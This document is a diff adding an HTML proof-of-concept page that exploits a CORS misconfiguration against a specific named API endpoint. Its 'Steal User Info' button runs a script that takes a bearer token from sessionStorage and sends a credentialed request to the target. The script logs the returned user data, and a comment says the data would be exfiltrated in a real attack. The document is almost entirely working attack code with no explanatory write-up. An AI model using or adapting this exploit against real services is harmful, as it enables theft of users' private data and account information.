@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>PoC to Exploit CORS Misconfiguration 2</h1>
+    <button onclick="stealData()">Steal User Info 2</button>
+
+    <script>
+        function getAuthToken() {
+            // Retrieve token from sessionStorage
+            return sessionStorage.getItem('token');
+        }
+
+        function stealData() {
+            const authToken = getAuthToken();
+
+            if (!authToken) {
+                console.error("Authorization token not found in session storage.");
+                return;
+            }
+
+             // Remove any quotes around the token
+                const cleanedToken = authToken.replace(/^"|"$/g, ''); // Remove leading/trailing quotes if they exist
+
+            fetch("https://corereginaam.tokomodal.id/api/v1/app/obas", {
+                method: "GET",
+                headers: {
+                    "Authorization": `Bearer ${cleanedToken}` // Use cleaned token value
+                    
+                },
+                credentials: "include" // Ensures cookies are sent along with the request
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                }
+                throw new Error("Network response was not ok.");
+            })
+            .then(data => {
+                console.log("Stolen User Info:", data); // Log sensitive data for testing; in real exploit, data would be exfiltrated
+            })
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
